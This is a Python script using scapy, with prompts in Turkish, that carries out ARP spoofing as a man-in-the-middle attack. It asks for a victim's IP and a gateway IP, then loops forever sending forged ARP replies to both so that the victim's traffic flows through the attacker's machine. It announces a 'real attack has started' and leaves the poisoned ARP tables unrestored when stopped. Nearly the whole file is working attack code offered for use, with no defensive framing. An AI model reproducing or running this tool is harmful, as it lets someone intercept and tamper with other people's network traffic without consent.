from scapy.all import *
import time
import sys

print("--- REAL ARP SPOOFER (MITM) ---")
target_ip = input("Hedef IP (Kurban): ")
gateway_ip = input("Modem IP (Gateway): ")

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    answered = srp(broadcast/arp_request, timeout=2, verbose=False)[0]
    return answered[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # Gerçek ARP cevabı üretiyoruz (op=2)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

try:
    print(f"⚡ GERÇEK SALDIRI BAŞLADI: {target_ip} <--> {gateway_ip}")
    print("İnternet trafiği şu an senin üzerinden akıyor...")
    sent_packets = 0
    while True:
        spoof(target_ip, gateway_ip) # Kurbana "Ben Modemim" de
        spoof(gateway_ip, target_ip) # Modeme "Ben Kurbanım" de
        sent_packets += 2
        print(f"\r[+] Gönderilen Zehirli Paket: {sent_packets}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Durduruldu. ARP tabloları düzeltilmedi (Manuel reset gerekebilir).")
except Exception as e:
    print(f"\n[X] Hata: {e} (Yönetici olarak çalıştır ve Npcap kur!)")